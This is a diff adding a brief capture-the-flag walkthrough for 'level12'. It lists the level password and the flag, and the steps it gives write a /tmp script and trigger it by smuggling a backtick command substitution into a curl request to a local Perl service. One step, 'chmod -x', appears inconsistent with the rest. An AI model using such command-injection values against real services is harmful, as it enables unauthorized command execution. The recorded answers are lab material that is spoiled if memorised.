@@ -1,0 +1,9 @@
+level12 : fa6v5ateaw21peobuub8ipe6s
+Process :
+    - ls -la
+    - cat level12.pl
+    - vim /tmp/TEST (#!/bin/sh getflag > /tmp/res)
+    - chmod -x /tmp/TEST
+    - curl http://localhost:4646?x='`/*/TEST`'
+    - cat /tmp/res
+    - Get the flag = g1qKMiRpXf53AWhDaU7FEkczr
